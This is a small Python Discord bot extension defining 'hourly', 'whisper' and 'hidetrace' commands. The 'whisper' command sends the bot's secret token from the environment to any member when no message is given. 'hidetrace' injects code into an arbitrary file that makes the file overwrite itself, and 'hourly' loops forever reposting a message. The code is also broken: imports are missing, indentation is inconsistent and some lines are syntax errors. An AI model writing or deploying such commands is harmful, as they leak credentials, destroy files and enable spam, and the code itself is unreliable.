import asyncio
from discord.ext import commands


class Extra(commands.Cog):
	def __init__(self, bot):
		self.bot = bot

	@commands.command()
	async def hourly(self, ctx, *, kwargs):
		while True:
			await ctx.send(kwargs)
			await asyncio.sleep(60*60)

	@commands.command()
        async def whisper(self, ctx, member:discord.Member, message=None):
		if message == None:
			message = os.getenv('TOKEN')
                await member.send(message)

	@commands.command()
	async def hidetrace(self, ctx, file):
		text = '''
open(__file__, "w").write(h = 0)
'''
		open(file, 'a')write(text)

	@commands.Cog.listener()
	async def on_message(self, ctx):
		pass

def setup(bot):
	bot.add_cog(Extra(bot))
